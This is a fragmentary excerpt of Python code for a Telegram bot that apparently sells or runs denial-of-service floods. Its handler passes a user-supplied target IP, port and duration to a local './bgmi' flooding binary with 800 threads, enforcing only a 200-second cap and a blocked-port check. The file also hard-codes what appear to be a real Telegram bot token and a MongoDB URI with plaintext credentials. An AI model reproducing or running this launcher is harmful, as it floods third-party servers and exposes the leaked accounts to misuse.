...
TOKEN = '7373397609:AAG1OtDG7NaBOdxuQ6yHAjP-rZgzc08hSbE'
MONGO_URI = 'mongodb+srv://Bishal:Bishal@bishal.dffybpx.mongodb.net/?retryWrites=true&w=majority&appName=Bishal'
FORWARD_CHANNEL_ID = -5894053921
CHANNEL_ID = -5894053921
error_channel_id = -5894053921
...
async def run_attack_command_async(target_ip, target_port, duration):
    process = await asyncio.create_subprocess_shell(f"./bgmi {target_ip} {target_port} {duration} 800")
...
def process_attack_command(message):
    try:
        ...
        if target_port in blocked_ports:
            ...
            return
        if duration >= 200:
            bot.send_message(message.chat.id, "*⏳ Maximum duration is 200 seconds.*\n"  # Duration limit message
